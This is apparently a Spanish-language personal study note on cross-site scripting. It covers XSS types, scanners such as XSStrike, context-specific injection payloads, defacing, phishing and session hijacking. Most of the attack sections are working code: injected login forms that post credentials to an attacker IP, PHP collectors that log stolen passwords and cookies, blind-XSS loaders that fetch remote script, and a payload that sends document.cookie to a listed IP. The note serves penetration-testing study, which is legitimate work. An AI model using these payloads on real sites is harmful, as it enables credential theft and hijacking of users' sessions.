23-11-2024 13:25
Status: #idea
Tags: [[Web Exploiting]]

# Cross Site Scripting (XSS)

El XSS es una vulnerabilidad web que nos permite ejecutar código javascript debido a una mala gestión de los inputs, ya que no se comprueba si viene código malicioso.

Las vulnerabilidades XSS son ejecutadas en el front-end de una aplicación, por lo tanto no se ejecutan en el back-end, pero si que pueden llegar a almacenarse en la base de datos y conseguir que se ejecuten de manera repetida y para otros usuarios.

## Tipos de XSS

- **Stored (Persistent) XSS:** El XSS persistente es de lo que estábamos hablando arriba. Consigue guardarse en base de datos, y será mostrado al usuario siempre que realice una acción, o en casos más graves, a otros usuarios también.
- **Reflected (Non-Persistent) XSS**: El XSS reflejado es un tipo de XSS que no se guarda en base de datos, pero que si se ejecuta en el navegador del usuario, por ejemplo, XSS en búsqueda, o mensajes de error.
- **DOM-based XSS**: Es un tipo de XSS no persistente, que lo que hace es mostrar lo que ha introducido el usuario en el input.

## Descubrimiento de XSS

### Automatic Discovery

Escáneres como Nessus, Burp Pro o ZAP tienen capacidades para detectar estos tres tipos de XSS. Normalmente, hacen dos tipos de scans, un pasivo, que revisa el código del lado del cliente para encontrar DOM based XSS, y otro activo, que envía varias payloads para conseguir encontrar los otros dos tipos de XSS.

Hay herramientas open source como [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), y [XSSer](https://github.com/epsylon/xsser).

#### XSS Strike

```shell-session
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py

XSStrike v3.1.4
...SNIP...
```

Una vez instalado, podremos ejecutarlo dándole nuestro objetivo con la flag -u.

```shell-session
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

        XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```

### Manual Discovery

#### XSS Payloads

La manera más básica para encontrar XSS es usar payloads contra los inputs de nuestro objetivo. Existen varias como [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), o [PayloadBox](https://github.com/payloadbox/xss-payload-list).

Cuando se piensa en XSS, tendemos a pensar en inputs HTML, pero no está limitado a esto, también se puede dar el caso de que se muestre en pantalla un valor reflejado de una cookie o cabeceras, por ejemplo, el user agent.

Lo que puedes hacer es por ejemplo, buscar e inspeccionar el código con las devtools y ver donde se está reflejando tu nombre de usuario, tu email, o datos que puedas modificar. A partir de ahí, podrías intentar utilizar payloads en estos datos que se ven reflejados.

Aquí podemos ver ejemplos de payloads muy comunes:

- `<img src=x onerror=alert()>`
- `<a href=javascript:alert()>test123`
- `<iframe src=javascript:alert()>`
- Con objetos (se puede modificar el atributo data):
	- `<object data="data:text/html, <script>alert(1)</script>"></object>`
	- `<script src=data:text/javascript, alert(1)></script>`

#### Contexto de XSS

Hay varios contextos en los que nos podremos encontrar un XSS, y se distinguen por la manera en la que maneja el front-end los valores que introducimos.

**Input**:
Se puede dar el caso de que nuestro valor se esté introduciendo en el value de un input, es decir, si ponemos nuestro nombre de usuario, y hay un input que pone `<input  value="test123">`.

En este contexto, podríamos romper directamente el atributo value y escaparlo, para que nuestra payload se ejecute. Por ejemplo, poner que nuestro nombre de usuario sea `test123"><script>alert(1)</script>`. También podríamos añadir un event handler de javascript en este input, por ejemplo `test123" onmouseover=alert(1)`.

**Textarea**:
En un textarea lo que hay dentro no se ejecutará como en el caso de un input, es decir, podemos tener `<textarea>test123<img src=x onerror=alert(2)></textarea>`y no se va a ejecutar esta alerta, ya que se interpretará como texto siempre.

Lo que tendremos que hacer, es cerrar el textarea y posteriormente ejecutar nuestro javascript, por ejemplo con el payload: `test123<img src=x onerror=alert(1)></textarea><img src=x onerror=alert(2)>`.

**Title:**
Se puede dar el caso de que se muestre en el título de la web nuestro nombre de usuario, o los datos que puedan ser vulnerables a XSS. En este caso, como en el caso anterior, tendremos que cerrar el tag del title, y poner nuestro payload posteriormente, por ejemplo: `test123</title><img src=x onerror=alert(1)>`.

**Style**:
Se puede dar el caso de que se incruste lo que introduzcamos en la etiqueta style, por lo tanto tendremos que cerrar esta etiqueta y posteriormente ejecutar nuestra payload, por ejemplo: `</style><img src=x onerror=alert(1)>`.

**Variables javascript**:
Se puede dar el caso de que lo que introduzcamos se meta en una variable de javascript, por ejemplo, en un cadena de texto. Podremos romper esto, con un apóstrofe o con un doble, dependiendo de como se defina la cadena de texto. Nos quedará algo así:

```javascript
var name = 'test123'';
```

Como vemos, esto no es javascript válido, ya que hay dos apóstrofes, tendríamos que hacer esto en nuestra payload: `test123';//`, consiguiendo así comentar el resto de lo que se encuentre en nuestro script. Posteriormente, podremos ejecutar lo que queramos y cerrar el tag del script antes del comentario, teniendo la payload así: `test123'alert(1);//`

```javascript
var name = 'test123';alert(1)//';
```

#### Code Review

La mejor manera de detectar XSS es conocer como funciona tanto el front-end como el back-end, ya que si conocemos esto, nos permitirá crear payloads custom que se ajusten a nuestro objetivo.

## Ataques XSS

### Defacing

Defacing es una técnica muy común, ya que nos permitirá cambiar como se ve la página web a través de un ataque XSS.

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

Por ejemplo, podríamos hacer lo siguiente para cambiar el color del background de la web:

```html
<script>document.body.style.background = "#141d2b"</script>
```

### Phishing

El XSS también puede terminar en phishing, tan sencillo como en vez de hacer defacement, poner una form que envíe una petición a un servidor remoto malicioso, suplantando así una form real de la página web.

Esto hará que el atacante tenga acceso a las credenciales de los usuarios.

Ejemplo de payload de form:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Podremos hacer un servidor con netcat, y escuchar cuando se haga una petición, pero esto sería algo inestable. La mejor opción es crear un servidor PHP en el que se guarden las peticiones de las credenciales en un archivo dentro de este servidor.

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```shell-session
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Esto nos permitiría tener dentro del archivo creds.txt todas las credenciales de usuarios.

## Blind XSS

Este es un tipo de XSS que no podemos ver, ya que se ejecutará en páginas a las que no tenemos acceso, como por ejemplo, paneles de administración.

Lo que se puede hacer en estos casos es intentar meter una payload que sea un script, que haga una llamada a nuestro servidor, consiguiendo así saber si es vulnerable o no. Esto nos puede permitir dar el paso al session hijacking, ya que podríamos enviar en esta request a nuestro fichero script.js y que dentro de este fichero, en un parámetro, venga la cookie del administrador, que posteriormente se podría usar para suplantar la sesión del admin.

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

## Session Hijacking

La mayoría de aplicaciones web usa cookies para almacenar la información del usuario, lo que permite que la sesión del usuario se mantenga activa inclusa después de horas.

Pero también existen problemas con las cookies, ya que si alguien se hace con estas, podrá suplantar la sesión del usuario vulnerado.

Como hemos visto antes, si usamos el blind xss, podremos crear un archivo script.js, que haga que cuando se cargue el panel de administración de nuestro objetivo, nos envíe la cookie de este usuario, a nuestro servidor PHP, por ejemplo.

Como alternativa, también podremos llamar directamente al archivo index.php haciendo el blind xss de esta manera:

"><script>new Image().src="http://10.10.15.131:81/index.php?c="+document.cookie</script>

Podríamos crear un fichero cookies.txt, como hicimos anteriormente para las credenciales.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Posteriormente, podremos ver como hay dos peticiones, la primera será a nuestro script.js, y la segunda al fichero index.php de nuestro servidor malicioso.

Una vez tengamos la cookie, será tan sencillo como editar en las herramientas de desarrollo el valor de la cookie para tener acceso al panel de administración.


---
# {{References}}